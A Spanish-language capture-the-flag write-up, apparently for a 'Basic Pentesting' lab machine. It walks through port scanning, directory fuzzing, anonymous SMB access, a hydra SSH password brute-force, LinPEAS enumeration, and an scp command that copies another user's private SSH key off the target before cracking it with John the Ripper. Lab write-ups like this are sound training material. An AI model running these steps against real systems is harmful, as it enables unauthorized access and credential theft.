# Basic Pentesting

## NMAP

![alt text](image.png)


Encontramos un apache(8080) y un smb (445)
![alt text](image-1.png)

![alt text](image-2.png)

## Fuzzing

    gobuster dir -u http://10.10.254.164/ -w Desktop/common.txt -x php 

![alt text](image-3.png)

Encontramos 2 archivos
![alt text](image-4.png)

Podemos ver que los desarrolladores se hablan por aqui
![alt text](image-5.png)

## SMB

Realizamos una busqueda de recursos compartidos.

    smbmap -H 10.10.148.28  

![alt text](image-6.png)

Listamos Anonymous

    smbmap -H 10.10.148.28 -r anonymous

![alt text](image-7.png)

Nos conectamos como Anonymous y descargamos el fichero. 

    smbclient //10.10.254.164/anonymous -N

    smb: \> get staff.txt

![alt text](image-10.png)

Dentro encontramos los nombres de usuario.
![alt text](image-11.png)

## Fuerza bruta

    hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.254.164

![alt text](image-12.png)

## SSH

Entramos con el usuario y contraseñas extraidos
![alt text](image-13.png)

## LinPEAS

En caso de no tenerlo, clonamos el repositorio

    git clone https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Pasamos LinPEAS a la máquina

    scp linpeas.sh jan@10.10.254.164:/tmp

![alt text](image-14.png)

Le damos permisos y lo ejecutamos

    chmod +x linpeas.sh

    ./linpeas.sh

Encontramos la clave SSH
![alt text](image-15.png)

La pasamos a nuestro ordenador 

    scp jan@10.10.254.164:/home/kay/.ssh/id_rsa /home/kali/Desktop

![alt text](image-16.png)

Pasamos el archivo a txt usando un script
![alt text](image-17.png)

Lo rompemos usando **JohnTheRipper**
![alt text](image-18.png)

## Clave final

Entramos con la clave
![alt text](image-19.png)

Aqui encontraremos la contraseña final
![alt text](image-20.png)